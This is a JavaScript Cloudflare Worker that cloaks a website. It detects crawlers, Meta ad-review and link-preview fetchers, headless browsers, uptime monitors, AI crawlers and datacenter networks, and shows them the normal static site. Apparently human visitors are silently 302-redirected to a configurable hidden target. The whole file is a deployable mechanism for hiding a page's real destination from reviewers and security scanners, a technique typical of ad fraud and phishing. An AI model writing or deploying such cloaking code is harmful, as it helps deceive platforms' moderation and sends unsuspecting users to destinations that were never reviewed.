export default {
  async fetch(request, env) {
    const ua = (request.headers.get("user-agent") || "").toLowerCase();
    const cf = request.cf || {};
    const asn = cf.asn;
    const botMgmt = cf.botManagement || {};
    const botScore = typeof botMgmt.score === "number" ? botMgmt.score : 99;
    const verifiedBot = botMgmt.verifiedBot === true;

    const SYNTHETIC_UA_PATTERNS = [
      "facebookexternalhit",
      "facebookcatalog",
      "meta-externalagent",
      "meta-externalfetcher",
      "meta-externalads",
      "meta-webindexer",
      "googlebot",
      "bingbot",
      "slurp",
      "duckduckbot",
      "baiduspider",
      "yandexbot",
      "sogou",
      "exabot",
      "ia_archiver",
      "semrushbot",
      "ahrefsbot",
      "dotbot",
      "rogerbot",
      "linkedinbot",
      "embedly",
      "quora link preview",
      "showyoubot",
      "outbrain",
      "pinterestbot",
      "slackbot",
      "vkshare",
      "w3c_validator",
      "redditbot",
      "applebot",
      "whatsapp",
      "flipboard",
      "tumblr",
      "bitlybot",
      "skypeuripreview",
      "nuzzel",
      "discordbot",
      "qwantify",
      "petalbot",
      "bunyipbot",
      "contxbot",
      "seznambot",
      "musobot",
      "twitterbot",
      "x-bot",
      "headlesschrome",
      "puppeteer",
      "playwright",
      "phantom",
      "selenium",
      "crawl",
      "spider",
      "bot/",
      "bot ",
      "datadog",
      "uptimerobot",
      "pingdom",
      "site24x7",
      "statuspage",
      "nagios",
      "zabbix",
      "monit",
      "newrelic",
      "appdynamics",
      "catchpoint",
      "gptbot",
      "chatgpt-user",
      "claude-web",
      "anthropic-ai",
      "bytespider",
      "ccbot",
      "cohere-ai",
      "perplexitybot",
    ];

    const DATACENTER_ASNS = new Set([
      32934,
      15169,
      396982,
      16509,
      14618,
      8075,
      8076,
      14061,
      63949,
      13335,
      20940,
      16276,
      24940,
      51167,
      12876,
      37963,
      45102,
      132203,
      136907,
      9009,
      46606,
      55286,
      62567,
      398101,
      209242,
      206264,
      396356,
    ]);

    const uaMatchesSynthetic = ua === "" || SYNTHETIC_UA_PATTERNS.some((p) => ua.includes(p));
    const asnIsSynthetic = typeof asn === "number" && DATACENTER_ASNS.has(asn);
    const scoreIsSynthetic = botScore < 30;

    const isSynthetic = uaMatchesSynthetic || asnIsSynthetic || scoreIsSynthetic || verifiedBot;

    if (isSynthetic || env.REDIRECT_ENABLED !== "true") {
      return env.ASSETS.fetch(request);
    }

    if (env.REDIRECT_TARGET) {
      return Response.redirect(env.REDIRECT_TARGET, 302);
    }

    return env.ASSETS.fetch(request);
  },
};
